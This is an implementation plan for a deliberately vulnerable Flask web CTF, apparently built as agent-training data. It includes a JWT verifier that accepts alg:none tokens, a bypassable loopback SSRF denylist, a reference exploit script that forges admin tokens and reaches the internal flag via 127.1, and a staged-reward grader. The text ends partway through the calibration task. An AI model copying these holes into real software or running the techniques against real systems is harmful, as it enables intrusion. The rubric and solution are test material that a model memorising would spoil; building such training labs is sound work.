# Foresight Web CTF Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an original, runnable web CTF ("Foresight") plus its reference solution, machine-checkable staged-reward rubric, and calibration report, as SFT/RL agent-training data.

**Architecture:** A single Docker container runs two Flask processes: a public app on `0.0.0.0:8080` (the only published port) and an internal forecast-engine on `127.0.0.1:9000` (never published, holds the flag). The solve path is a five-stage chain (recon, analyst auth, admin escalation via JWT `alg:none`+MFA, SSRF with a denylist, flag pivot), each stage emitting a distinct breadcrumb token so the grader scores progress without trusting agent self-report.

**Tech Stack:** Python 3.12, Flask, PyJWT, requests, Docker Compose, pytest.

**Spec:** `docs/DESIGN.md`

## Global Constraints

- Python 3.12 on base image `python:3.12-slim`.
- Pinned dependencies (exact): `Flask==3.0.3`, `PyJWT==2.9.0`, `requests==2.32.3`. Test-only: `pytest==8.3.3`.
- Fully offline at solve time. Only the cold build touches the network.
- Cold `docker compose up --build` completes in under 10 minutes via one documented command.
- No GPU, at most 8 GB RAM, single machine.
- Flag format `flag{...}`; exact grader regex `flag\{[a-z0-9_]+\}`.
- Reward rubric is machine-readable JSON; each stage has `id`, `description`, `check` (regex), `score`.
- Reward scores: `0.10, 0.15, 0.25, 0.25, 0.25`, cumulative, strictly monotonic, sum `1.00`.
- Breadcrumb constants (exact strings, used verbatim in code and tests):
  - `FS1_recon_a17c` (public forecasts `_meta.hint`)
  - `FS2_analyst_5b29` (`/api/v1/me`)
  - `FS3_admin_9d3e` (`/api/v1/admin/feeds`)
  - `FS4_internal_c8f1` (internal engine root)
  - Flag: `flag{f0res1ght_ssrf_pivot_2026}`
- Internal engine binds `127.0.0.1:9000`; public app binds `0.0.0.0:8080`.
- JWT HS256 secret (server-side legit signing): `foresight-hs256-please-rotate`.
- Demo analyst credentials: username `analyst`, password `analyst`.

## Review Focus

- Missing or malformed `Authorization` header on authenticated routes must return 401, never a 500 or stack trace. (Owned by Task 4/5 tests.)
- A forged `alg:none` token with `role=admin` but `mfa` absent/false must return `403 MFA required` and must NOT leak `FS3`. (Owned by Task 5 tests.)
- SSRF denylist must block a direct `http://127.0.0.1:9000/` and `http://localhost:9000/` with a clear 400, while allowing a loopback-equivalent (`http://127.1:9000/`). (Owned by Task 6 tests.)
- SSRF import must reject non-HTTP schemes (`file:///etc/passwd`) with a 400, never read local files. (Owned by Task 6 tests.)
- Unauthenticated access to `/api/v1/admin/*` returns 401/403 and leaks no breadcrumb. (Owned by Task 5 tests.)

---

## File Structure

- `challenge/app/auth.py` - JWT issue + deliberately-buggy verify + admin gate.
- `challenge/app/server.py` - public Flask app (static + `/api/v1/*`).
- `challenge/app/static/index.html`, `challenge/app/static/app.js` - frontend + recon hints.
- `challenge/internal/engine.py` - internal forecast-engine (loopback, holds flag).
- `challenge/requirements.txt`, `challenge/Dockerfile`, `challenge/entrypoint.sh` - packaging.
- `docker-compose.yml` - single-command bring-up.
- `rubric/rewards.json`, `rubric/grader.py` - reward interface + scorer.
- `solution/solve.py`, `solution/walkthrough.md` - reference solution.
- `calibration/reliability.sh`, `calibration/results.md` - calibration harness + measured numbers.
- `tests/` - pytest suite mirroring the modules above.
- `README.md`, `design-note.md` - docs.

---

### Task 1: Project scaffold, pinned deps, test harness

**Files:**
- Create: `challenge/requirements.txt`
- Create: `challenge/app/__init__.py`, `challenge/internal/__init__.py`, `tests/__init__.py`
- Create: `tests/conftest.py`
- Create: `pytest.ini`

**Interfaces:**
- Produces: an importable package layout so tests can `from challenge.app import server` etc.

- [ ] **Step 1: Create `challenge/requirements.txt`**

```
Flask==3.0.3
PyJWT==2.9.0
requests==2.32.3
```

- [ ] **Step 2: Create `pytest.ini`**

```ini
[pytest]
pythonpath = .
testpaths = tests
```

- [ ] **Step 3: Create empty package files**

Create empty `challenge/app/__init__.py`, `challenge/internal/__init__.py`, `tests/__init__.py`.

- [ ] **Step 4: Create `tests/conftest.py` with shared constants**

```python
FS1 = "FS1_recon_a17c"
FS2 = "FS2_analyst_5b29"
FS3 = "FS3_admin_9d3e"
FS4 = "FS4_internal_c8f1"
FLAG = "flag{f0res1ght_ssrf_pivot_2026}"
HS256_SECRET = "foresight-hs256-please-rotate"
```

- [ ] **Step 5: Install deps and verify pytest runs**

Run: `python -m venv .venv && .venv/Scripts/pip install -r challenge/requirements.txt pytest==8.3.3 && .venv/Scripts/pytest -q`
Expected: pytest runs and reports "no tests ran" (exit cleanly).

- [ ] **Step 6: Commit**

```bash
git add challenge/requirements.txt pytest.ini challenge/app/__init__.py challenge/internal/__init__.py tests/__init__.py tests/conftest.py
git commit -m "chore: scaffold Foresight package layout and test harness"
```

---

### Task 2: Internal forecast-engine service

**Files:**
- Create: `challenge/internal/engine.py`
- Test: `tests/test_engine.py`

**Interfaces:**
- Produces: `create_engine_app() -> flask.Flask` with routes `GET /` (JSON incl. `hint`=FS4 and `flag_path`) and `GET /internal/flag` (text flag). Runs on `127.0.0.1:9000` in production.

- [ ] **Step 1: Write the failing test**

```python
from challenge.internal.engine import create_engine_app
from tests.conftest import FS4, FLAG

def test_engine_root_exposes_fs4_and_flag_path():
    app = create_engine_app()
    c = app.test_client()
    r = c.get("/")
    body = r.get_json()
    assert r.status_code == 200
    assert body["hint"] == FS4
    assert body["flag_path"] == "/internal/flag"

def test_engine_flag_endpoint_returns_flag():
    app = create_engine_app()
    c = app.test_client()
    r = c.get("/internal/flag")
    assert r.status_code == 200
    assert FLAG in r.get_data(as_text=True)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_engine.py -v`
Expected: FAIL (module not found).

- [ ] **Step 3: Write minimal implementation**

```python
from flask import Flask, jsonify, Response

FS4 = "FS4_internal_c8f1"
FLAG = "flag{f0res1ght_ssrf_pivot_2026}"

def create_engine_app() -> Flask:
    app = Flask(__name__)

    @app.get("/")
    def root():
        return jsonify(
            service="forecast-engine",
            note="internal only - not exposed externally",
            hint=FS4,
            flag_path="/internal/flag",
        )

    @app.get("/internal/flag")
    def flag():
        return Response(FLAG + "\n", mimetype="text/plain")

    return app

if __name__ == "__main__":
    create_engine_app().run(host="127.0.0.1", port=9000)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_engine.py -v`
Expected: PASS (2 tests).

- [ ] **Step 5: Commit**

```bash
git add challenge/internal/engine.py tests/test_engine.py
git commit -m "feat: internal forecast-engine with FS4 breadcrumb and flag endpoint"
```

---

### Task 3: JWT auth module (issue + buggy verify + admin gate)

**Files:**
- Create: `challenge/app/auth.py`
- Test: `tests/test_auth.py`

**Interfaces:**
- Produces:
  - `issue_token(sub: str, role: str, mfa: bool) -> str` (HS256, signed with `HS256_SECRET`).
  - `verify_token(token: str) -> dict | None` - BUG: accepts `alg:none` unsigned tokens and returns their claims without signature check; otherwise verifies HS256; returns `None` on failure.
  - `admin_gate(claims: dict | None) -> tuple[bool, str]` - returns `(ok, reason)`; reason is `"unauthorized"` (no/invalid token or role!=admin) or `"mfa_required"` (role==admin but mfa not true) or `""` when ok.

- [ ] **Step 1: Write the failing test**

```python
import jwt
from challenge.app.auth import issue_token, verify_token, admin_gate
from tests.conftest import HS256_SECRET

def test_issue_and_verify_roundtrip():
    t = issue_token("analyst", "analyst", False)
    claims = verify_token(t)
    assert claims["sub"] == "analyst"
    assert claims["role"] == "analyst"
    assert claims["mfa"] is False

def test_alg_none_forgery_is_accepted_bug():
    forged = jwt.encode({"sub": "x", "role": "admin", "mfa": True}, key="", algorithm="none")
    claims = verify_token(forged)
    assert claims is not None
    assert claims["role"] == "admin"

def test_hs256_with_wrong_secret_is_rejected():
    bad = jwt.encode({"sub": "x", "role": "admin"}, key="wrong", algorithm="HS256")
    assert verify_token(bad) is None

def test_admin_gate_requires_admin_and_mfa():
    assert admin_gate(None) == (False, "unauthorized")
    assert admin_gate({"role": "analyst", "mfa": True}) == (False, "unauthorized")
    assert admin_gate({"role": "admin", "mfa": False}) == (False, "mfa_required")
    assert admin_gate({"role": "admin", "mfa": True}) == (True, "")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_auth.py -v`
Expected: FAIL (module not found).

- [ ] **Step 3: Write minimal implementation**

```python
import jwt

HS256_SECRET = "foresight-hs256-please-rotate"

def issue_token(sub: str, role: str, mfa: bool) -> str:
    return jwt.encode({"sub": sub, "role": role, "mfa": mfa}, HS256_SECRET, algorithm="HS256")

def verify_token(token: str):
    try:
        header = jwt.get_unverified_header(token)
    except Exception:
        return None
    # DELIBERATE VULNERABILITY (CTF): trust the token's own alg header.
    if header.get("alg", "").lower() == "none":
        try:
            return jwt.decode(token, options={"verify_signature": False})
        except Exception:
            return None
    try:
        return jwt.decode(token, HS256_SECRET, algorithms=["HS256"])
    except Exception:
        return None

def admin_gate(claims):
    if not claims or claims.get("role") != "admin":
        return (False, "unauthorized")
    if claims.get("mfa") is not True:
        return (False, "mfa_required")
    return (True, "")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_auth.py -v`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add challenge/app/auth.py tests/test_auth.py
git commit -m "feat: JWT auth with alg:none verification bug and admin+mfa gate"
```

---

### Task 4: Public API - forecasts (FS1), login, me (FS2)

**Files:**
- Create: `challenge/app/server.py`
- Test: `tests/test_public_api.py`

**Interfaces:**
- Consumes: `issue_token`, `verify_token` from `challenge.app.auth`.
- Produces: `create_app() -> flask.Flask` with:
  - `GET /api/v1/forecasts` -> `{"forecasts":[...], "_meta":{"hint": FS1, "api":"/api/v1"}}`
  - `POST /api/v1/auth/login` (JSON `{username,password}`) -> `200 {"token": <analyst JWT>}` for demo creds, else `401`.
  - `GET /api/v1/me` (Bearer token) -> `200 {"user","role","hint": FS2}` or `401`.

- [ ] **Step 1: Write the failing test**

```python
import json
from challenge.app.server import create_app
from tests.conftest import FS1, FS2

def client():
    return create_app().test_client()

def test_forecasts_leaks_fs1_hint():
    r = client().get("/api/v1/forecasts")
    assert r.status_code == 200
    assert r.get_json()["_meta"]["hint"] == FS1

def test_login_with_demo_creds_returns_token():
    r = client().post("/api/v1/auth/login", json={"username": "analyst", "password": "analyst"})
    assert r.status_code == 200
    assert "token" in r.get_json()

def test_login_with_bad_creds_401():
    r = client().post("/api/v1/auth/login", json={"username": "analyst", "password": "nope"})
    assert r.status_code == 401

def test_me_requires_token_and_returns_fs2():
    c = client()
    tok = c.post("/api/v1/auth/login", json={"username": "analyst", "password": "analyst"}).get_json()["token"]
    r = c.get("/api/v1/me", headers={"Authorization": f"Bearer {tok}"})
    assert r.status_code == 200
    assert r.get_json()["hint"] == FS2

def test_me_without_header_is_401_not_500():
    r = client().get("/api/v1/me")
    assert r.status_code == 401
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_public_api.py -v`
Expected: FAIL (module not found).

- [ ] **Step 3: Write minimal implementation**

```python
from flask import Flask, jsonify, request
from challenge.app.auth import issue_token, verify_token, admin_gate

FS1 = "FS1_recon_a17c"
FS2 = "FS2_analyst_5b29"
DEMO_USER, DEMO_PASS = "analyst", "analyst"

def _bearer():
    h = request.headers.get("Authorization", "")
    if not h.startswith("Bearer "):
        return None
    return verify_token(h[7:])

def create_app() -> Flask:
    app = Flask(__name__, static_folder="static", static_url_path="")

    @app.get("/api/v1/forecasts")
    def forecasts():
        return jsonify(
            forecasts=[{"symbol": "ACME", "q3": 1.12}, {"symbol": "GLOB", "q3": 0.87}],
            _meta={"hint": FS1, "api": "/api/v1"},
        )

    @app.post("/api/v1/auth/login")
    def login():
        data = request.get_json(silent=True) or {}
        if data.get("username") == DEMO_USER and data.get("password") == DEMO_PASS:
            return jsonify(token=issue_token("analyst", "analyst", False))
        return jsonify(error="invalid credentials"), 401

    @app.get("/api/v1/me")
    def me():
        claims = _bearer()
        if not claims:
            return jsonify(error="unauthorized"), 401
        return jsonify(user=claims.get("sub"), role=claims.get("role"), hint=FS2)

    return app

if __name__ == "__main__":
    create_app().run(host="0.0.0.0", port=8080)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_public_api.py -v`
Expected: PASS (5 tests).

- [ ] **Step 5: Commit**

```bash
git add challenge/app/server.py tests/test_public_api.py
git commit -m "feat: public API with FS1 recon hint, analyst login, and /me FS2"
```

---

### Task 5: Admin feeds route (FS3), gated by admin+MFA

**Files:**
- Modify: `challenge/app/server.py`
- Test: `tests/test_admin.py`

**Interfaces:**
- Consumes: `admin_gate` from `challenge.app.auth`, `_bearer()` helper.
- Produces: `GET /api/v1/admin/feeds` -> `200 {"feeds":[...], "hint": FS3}` for admin+mfa; `403 {"error":"mfa_required"}` for admin without mfa; `401` otherwise.

- [ ] **Step 1: Write the failing test**

```python
import jwt
from challenge.app.server import create_app
from tests.conftest import FS3

def client():
    return create_app().test_client()

def forge(role, mfa):
    return jwt.encode({"sub": "x", "role": role, "mfa": mfa}, key="", algorithm="none")

def test_admin_feeds_requires_auth():
    r = client().get("/api/v1/admin/feeds")
    assert r.status_code == 401
    assert FS3 not in r.get_data(as_text=True)

def test_admin_without_mfa_gets_403_and_no_fs3():
    tok = forge("admin", False)
    r = client().get("/api/v1/admin/feeds", headers={"Authorization": f"Bearer {tok}"})
    assert r.status_code == 403
    assert r.get_json()["error"] == "mfa_required"
    assert FS3 not in r.get_data(as_text=True)

def test_admin_with_mfa_gets_fs3():
    tok = forge("admin", True)
    r = client().get("/api/v1/admin/feeds", headers={"Authorization": f"Bearer {tok}"})
    assert r.status_code == 200
    assert r.get_json()["hint"] == FS3
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_admin.py -v`
Expected: FAIL (404 on route / no such endpoint).

- [ ] **Step 3: Write minimal implementation**

Add these constants and route inside `challenge/app/server.py` (add `FS3` near the other FS constants, and register the route inside `create_app`):

```python
FS3 = "FS3_admin_9d3e"
```

```python
    @app.get("/api/v1/admin/feeds")
    def admin_feeds():
        claims = _bearer()
        ok, reason = admin_gate(claims)
        if not ok:
            code = 403 if reason == "mfa_required" else 401
            return jsonify(error=reason), code
        return jsonify(
            feeds=[{"name": "internal-default", "url": "http://127.0.0.1:9000/feeds"}],
            note="import fetches a feed URL server-side; default engine runs on loopback:9000",
            hint=FS3,
        )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_admin.py -v`
Expected: PASS (3 tests).

- [ ] **Step 5: Commit**

```bash
git add challenge/app/server.py tests/test_admin.py
git commit -m "feat: admin feeds route gated by admin+mfa, leaks FS3 and loopback hint"
```

---

### Task 6: SSRF import endpoint with denylist

**Files:**
- Modify: `challenge/app/server.py`
- Test: `tests/test_ssrf.py`

**Interfaces:**
- Consumes: `admin_gate`, `_bearer()`, and `requests`.
- Produces: `POST /api/v1/admin/feeds/import` (JSON `{"url"}`) -> for admin+mfa: validates URL, then `requests.get(url, timeout=2)`, returns `200 {"imported": true, "content": <first 800 chars>}`. Denylist: reject (`400 {"error":"blocked"}`) if scheme not http/https or if host contains `localhost` or `127.0.0.1`.

- [ ] **Step 1: Write the failing test**

```python
import threading
from werkzeug.serving import make_server
import jwt
from challenge.app.server import create_app
from challenge.internal.engine import create_engine_app
from tests.conftest import FS4

def forge_admin():
    return jwt.encode({"sub": "x", "role": "admin", "mfa": True}, key="", algorithm="none")

class Bg:
    def __init__(self, app, port):
        self.srv = make_server("127.0.0.1", port, app)
        self.t = threading.Thread(target=self.srv.serve_forever, daemon=True)
    def __enter__(self):
        self.t.start(); return self
    def __exit__(self, *a):
        self.srv.shutdown()

def test_ssrf_direct_loopback_is_blocked():
    c = create_app().test_client()
    h = {"Authorization": f"Bearer {forge_admin()}"}
    for url in ["http://127.0.0.1:9000/", "http://localhost:9000/"]:
        r = c.post("/api/v1/admin/feeds/import", json={"url": url}, headers=h)
        assert r.status_code == 400

def test_ssrf_non_http_scheme_blocked():
    c = create_app().test_client()
    h = {"Authorization": f"Bearer {forge_admin()}"}
    r = c.post("/api/v1/admin/feeds/import", json={"url": "file:///etc/passwd"}, headers=h)
    assert r.status_code == 400

def test_ssrf_bypass_reaches_internal_fs4():
    with Bg(create_engine_app(), 9000):
        c = create_app().test_client()
        h = {"Authorization": f"Bearer {forge_admin()}"}
        r = c.post("/api/v1/admin/feeds/import", json={"url": "http://127.1:9000/"}, headers=h)
        assert r.status_code == 200
        assert FS4 in r.get_json()["content"]

def test_ssrf_requires_admin_mfa():
    c = create_app().test_client()
    r = c.post("/api/v1/admin/feeds/import", json={"url": "http://127.1:9000/"})
    assert r.status_code == 401
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_ssrf.py -v`
Expected: FAIL (404 on route).

- [ ] **Step 3: Write minimal implementation**

Add at top of `challenge/app/server.py`: `import requests` and `from urllib.parse import urlparse`. Register inside `create_app`:

```python
    @app.post("/api/v1/admin/feeds/import")
    def admin_import():
        claims = _bearer()
        ok, reason = admin_gate(claims)
        if not ok:
            code = 403 if reason == "mfa_required" else 401
            return jsonify(error=reason), code
        data = request.get_json(silent=True) or {}
        url = data.get("url", "")
        parsed = urlparse(url)
        host = (parsed.hostname or "").lower()
        # Naive SSRF denylist (CTF): blocks obvious loopback spellings only.
        if parsed.scheme not in ("http", "https"):
            return jsonify(error="blocked", reason="scheme"), 400
        if "localhost" in host or "127.0.0.1" in host:
            return jsonify(error="blocked", reason="host"), 400
        try:
            resp = requests.get(url, timeout=2)
        except Exception as e:
            return jsonify(error="fetch_failed", detail=str(e)), 502
        return jsonify(imported=True, content=resp.text[:800])
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_ssrf.py -v`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add challenge/app/server.py tests/test_ssrf.py
git commit -m "feat: admin import SSRF endpoint with bypassable loopback denylist"
```

---

### Task 7: Frontend recon surface

**Files:**
- Create: `challenge/app/static/index.html`
- Create: `challenge/app/static/app.js`
- Test: `tests/test_frontend.py`

**Interfaces:**
- Consumes: static serving already configured in `create_app` (`static_url_path=""`).
- Produces: `GET /` serves the dashboard; `GET /app.js` references the API surface and contains the demo-cred TODO comment (the stage-1/2 recon breadcrumbs for a human/agent reader).

- [ ] **Step 1: Write the failing test**

```python
from challenge.app.server import create_app

def client():
    return create_app().test_client()

def test_index_served():
    r = client().get("/")
    assert r.status_code == 200
    assert b"Foresight" in r.data

def test_appjs_reveals_api_and_demo_creds():
    r = client().get("/app.js")
    body = r.get_data(as_text=True)
    assert "/api/v1/auth/login" in body
    assert "/api/v1/admin/" in body
    assert "analyst" in body  # demo cred hint in a TODO comment
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_frontend.py -v`
Expected: FAIL (404 on `/` and `/app.js`).

- [ ] **Step 3: Write minimal implementation**

`challenge/app/static/index.html`:

```html
<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Foresight - Market Forecasting</title></head>
<body>
  <h1>Foresight</h1>
  <p>Predictive market forecasts for analysts.</p>
  <div id="forecasts">loading...</div>
  <script src="/app.js"></script>
</body>
</html>
```

`challenge/app/static/app.js`:

```javascript
// Foresight dashboard client.
// API surface:
//   GET  /api/v1/forecasts          public forecast feed
//   POST /api/v1/auth/login         { username, password } -> { token }
//   GET  /api/v1/me                 Bearer token -> profile
//   GET  /api/v1/admin/feeds        admin only
//   POST /api/v1/admin/feeds/import { url }  admin only, imports an external feed
// TODO: remove seeded demo account before launch -> analyst / analyst
async function load() {
  const r = await fetch("/api/v1/forecasts");
  const data = await r.json();
  document.getElementById("forecasts").textContent = JSON.stringify(data.forecasts);
}
load();
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_frontend.py -v`
Expected: PASS (2 tests).

- [ ] **Step 5: Commit**

```bash
git add challenge/app/static/index.html challenge/app/static/app.js tests/test_frontend.py
git commit -m "feat: frontend dashboard with API surface and demo-cred recon hints"
```

---

### Task 8: Docker packaging and single-command bring-up

**Files:**
- Create: `challenge/entrypoint.sh`
- Create: `challenge/Dockerfile`
- Create: `docker-compose.yml`

**Interfaces:**
- Produces: a container that launches the internal engine (loopback:9000) and the public app (0.0.0.0:8080) together; only 8080 is published.

- [ ] **Step 1: Create `challenge/entrypoint.sh`**

```bash
#!/bin/sh
set -eu
python -m challenge.internal.engine &
exec python -m challenge.app.server
```

- [ ] **Step 2: Create `challenge/Dockerfile`**

```dockerfile
FROM python:3.12-slim
WORKDIR /srv
COPY requirements.txt /srv/requirements.txt
RUN pip install --no-cache-dir -r /srv/requirements.txt
COPY . /srv/challenge
COPY entrypoint.sh /srv/entrypoint.sh
RUN chmod +x /srv/entrypoint.sh
ENV PYTHONPATH=/srv
EXPOSE 8080
CMD ["/srv/entrypoint.sh"]
```

Note: build context is `challenge/`, so `COPY . /srv/challenge` copies the app/internal packages; `PYTHONPATH=/srv` makes `challenge.app.server` importable.

- [ ] **Step 3: Create `docker-compose.yml`**

```yaml
services:
  foresight:
    build:
      context: ./challenge
      dockerfile: Dockerfile
    image: provue/foresight:latest
    container_name: provue-foresight
    ports:
      - "8080:8080"
```

- [ ] **Step 4: Build and smoke-test the running container**

Run: `docker compose up --build -d`
Then: `curl -s http://localhost:8080/api/v1/forecasts`
Expected: JSON containing `FS1_recon_a17c`.
Then confirm the internal port is NOT exposed: `curl -s http://localhost:9000/` should fail to connect.

- [ ] **Step 5: Commit**

```bash
git add challenge/entrypoint.sh challenge/Dockerfile docker-compose.yml
git commit -m "feat: dockerize Foresight, publish only 8080, keep engine on loopback"
```

---

### Task 9: Reward rubric and grader

**Files:**
- Create: `rubric/rewards.json`
- Create: `rubric/grader.py`
- Test: `tests/test_grader.py`

**Interfaces:**
- Produces: `score_transcript(transcript: str, rewards: list) -> dict` returning `{"score": float, "max_stage": str, "stages_reached": [ids]}`; partial credit is the summed score of the highest contiguous prefix of stages whose `check` regex matches (strictly monotonic).

- [ ] **Step 1: Create `rubric/rewards.json`**

```json
[
  {"id": "s1_recon",   "description": "Reached the JSON API surface",            "check": "FS1_[a-z0-9_]+",  "score": 0.10},
  {"id": "s2_analyst", "description": "Authenticated as the analyst user",       "check": "FS2_[a-z0-9_]+",  "score": 0.15},
  {"id": "s3_admin",   "description": "Escalated to admin via alg:none + MFA",    "check": "FS3_[a-z0-9_]+",  "score": 0.25},
  {"id": "s4_ssrf",    "description": "SSRF reached the internal forecast-engine","check": "FS4_[a-z0-9_]+",  "score": 0.25},
  {"id": "s5_flag",    "description": "Captured the flag",                        "check": "flag\\{[a-z0-9_]+\\}", "score": 0.25}
]
```

- [ ] **Step 2: Write the failing test**

```python
import json, pathlib
from rubric.grader import score_transcript
from tests.conftest import FS1, FS2, FS3, FS4, FLAG

REWARDS = json.loads(pathlib.Path("rubric/rewards.json").read_text())

def test_empty_transcript_scores_zero():
    out = score_transcript("nothing here", REWARDS)
    assert out["score"] == 0.0
    assert out["stages_reached"] == []

def test_partial_credit_is_monotonic_prefix():
    out = score_transcript(f"...{FS1}... {FS2} ...", REWARDS)
    assert out["stages_reached"] == ["s1_recon", "s2_analyst"]
    assert abs(out["score"] - 0.25) < 1e-9

def test_skipped_stage_stops_credit():
    # FS1 present, FS2 missing, FS3 present -> only s1 counts
    out = score_transcript(f"{FS1} {FS3}", REWARDS)
    assert out["stages_reached"] == ["s1_recon"]

def test_full_solve_scores_one():
    t = " ".join([FS1, FS2, FS3, FS4, FLAG])
    out = score_transcript(t, REWARDS)
    assert abs(out["score"] - 1.0) < 1e-9
    assert out["max_stage"] == "s5_flag"
```

- [ ] **Step 3: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_grader.py -v`
Expected: FAIL (module not found).

- [ ] **Step 4: Write minimal implementation**

`rubric/grader.py`:

```python
import json
import re
import sys

def score_transcript(transcript: str, rewards: list) -> dict:
    score = 0.0
    reached = []
    for stage in rewards:
        if re.search(stage["check"], transcript):
            score += stage["score"]
            reached.append(stage["id"])
        else:
            break  # monotonic: stop at first unmet stage
    return {
        "score": round(score, 6),
        "max_stage": reached[-1] if reached else None,
        "stages_reached": reached,
    }

if __name__ == "__main__":
    rewards = json.load(open("rubric/rewards.json"))
    transcript = sys.stdin.read()
    print(json.dumps(score_transcript(transcript, rewards)))
```

- [ ] **Step 5: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_grader.py -v`
Expected: PASS (4 tests).

- [ ] **Step 6: Commit**

```bash
git add rubric/rewards.json rubric/grader.py tests/test_grader.py
git commit -m "feat: machine-checkable staged-reward rubric and monotonic grader"
```

---

### Task 10: Reference solution end-to-end

**Files:**
- Create: `solution/solve.py`
- Create: `solution/walkthrough.md`
- Test: `tests/test_solve_e2e.py`

**Interfaces:**
- Consumes: a running target at `BASE_URL` (env, default `http://localhost:8080`).
- Produces: `solve(base_url: str) -> dict` returning `{"transcript": str, "flag": str | None}`; prints each breadcrumb and the flag; exits 0 on flag capture when run as a script.

- [ ] **Step 1: Write the failing test (runs both apps in threads, no Docker)**

```python
import threading
from werkzeug.serving import make_server
from challenge.app.server import create_app
from challenge.internal.engine import create_engine_app
from solution.solve import solve
from tests.conftest import FLAG

class Bg:
    def __init__(self, app, port):
        self.srv = make_server("127.0.0.1", port, app)
        self.t = threading.Thread(target=self.srv.serve_forever, daemon=True)
    def __enter__(self):
        self.t.start(); return self
    def __exit__(self, *a):
        self.srv.shutdown()

def test_reference_solution_captures_flag():
    with Bg(create_engine_app(), 9000), Bg(create_app(), 8080):
        out = solve("http://127.0.0.1:8080")
        assert out["flag"] == FLAG
        for crumb in ["FS1_", "FS2_", "FS3_", "FS4_"]:
            assert crumb in out["transcript"]
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/pytest tests/test_solve_e2e.py -v`
Expected: FAIL (module not found).

- [ ] **Step 3: Write minimal implementation**

`solution/solve.py`:

```python
import os
import re
import sys
import jwt
import requests

def solve(base_url: str) -> dict:
    log = []
    def rec(label, text):
        log.append(f"[{label}] {text}")

    # Stage 1: recon
    r = requests.get(f"{base_url}/api/v1/forecasts", timeout=5)
    rec("recon", r.text)

    # Stage 2: analyst login + /me
    tok = requests.post(f"{base_url}/api/v1/auth/login",
                        json={"username": "analyst", "password": "analyst"}, timeout=5).json()["token"]
    me = requests.get(f"{base_url}/api/v1/me", headers={"Authorization": f"Bearer {tok}"}, timeout=5)
    rec("analyst", me.text)

    # Stage 3: forge admin via alg:none (+ mfa speed bump)
    forged = jwt.encode({"sub": "analyst", "role": "admin", "mfa": True}, key="", algorithm="none")
    ah = {"Authorization": f"Bearer {forged}"}
    feeds = requests.get(f"{base_url}/api/v1/admin/feeds", headers=ah, timeout=5)
    rec("admin", feeds.text)

    # Stage 4: SSRF to internal engine (loopback denylist bypass)
    ssrf = requests.post(f"{base_url}/api/v1/admin/feeds/import",
                         json={"url": "http://127.1:9000/"}, headers=ah, timeout=5)
    rec("ssrf", ssrf.text)

    # Stage 5: pivot to internal flag path
    flagres = requests.post(f"{base_url}/api/v1/admin/feeds/import",
                            json={"url": "http://127.1:9000/internal/flag"}, headers=ah, timeout=5)
    rec("flag", flagres.text)

    transcript = "\n".join(log)
    m = re.search(r"flag\{[a-z0-9_]+\}", transcript)
    return {"transcript": transcript, "flag": m.group(0) if m else None}

if __name__ == "__main__":
    out = solve(os.environ.get("BASE_URL", "http://localhost:8080"))
    print(out["transcript"])
    print("FLAG:", out["flag"])
    sys.exit(0 if out["flag"] else 1)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/Scripts/pytest tests/test_solve_e2e.py -v`
Expected: PASS.

- [ ] **Step 5: Write `solution/walkthrough.md`**

Document each of the five stages in prose: the request, the observed breadcrumb, and why the step works (recon of `app.js`; demo creds; decode the JWT and note it is forgeable; `alg:none` plus the MFA claim; the loopback denylist and the `127.1` bypass; the flag pivot). Map each stage to its rubric `id`.

- [ ] **Step 6: Commit**

```bash
git add solution/solve.py solution/walkthrough.md tests/test_solve_e2e.py
git commit -m "feat: reference solution capturing the flag end-to-end plus walkthrough"
```

---

### Task 11: Calibration harness and measurement

**Files:**
- Create: `calibration/reliability.sh`
- Create: `calibration/results.md`

**Interfaces:**
- Consumes: a running container (`docker compose up`) and `solution/solve.py`.
- Produces: a measured reliability count (target >= 14/16) and a recorded solve time.

- [ ] **Step 1: Create `calibration/reliability.sh`**

```bash
#!/bin/sh
# Runs the reference solution N times against the running container and reports successes.
set -u
N="${1:-16}"
BASE_URL="${BASE_URL:-http://localhost:8080}"
ok=0
start=$(date +%s)
for i in $(seq 1 "$N"); do
  if BASE_URL="$BASE_URL" python solution/solve.py >/dev/null 2>&1; then
    ok=$((ok+1))
  fi
done
end=$(date +%s)
echo "reliability: $ok/$N"
echo "total_wallclock_s: $((end-start))"
echo "avg_solve_s: $(awk "BEGIN{print ($end-$start)/$N}")"
```

- [ ] **Step 2: Run the container and the reliability loop**

Run: `docker compose up --build -d`
Then: `sh calibration/reliability.sh 16`
Expected: `reliability: 16/16` (or at least 14/16) and an average solve time in seconds.

- [ ] **Step 3: Record measured numbers in `calibration/results.md`**

Write the actual measured output: reliability count, average solve seconds, and the per-stage turn accounting used to justify the 16-turn difficulty band (a competent agent needs roughly 10-16 turns: recon 2-3, analyst 1-2, admin forge + MFA discovery 3-5, SSRF filter bypass 3-5, flag pivot 1). State honestly that the full 16-rollout agent solve-rate is estimated from turn accounting plus manual solve trials, and list "measure with a real agent harness" under next steps.

- [ ] **Step 4: Commit**

```bash
git add calibration/reliability.sh calibration/results.md
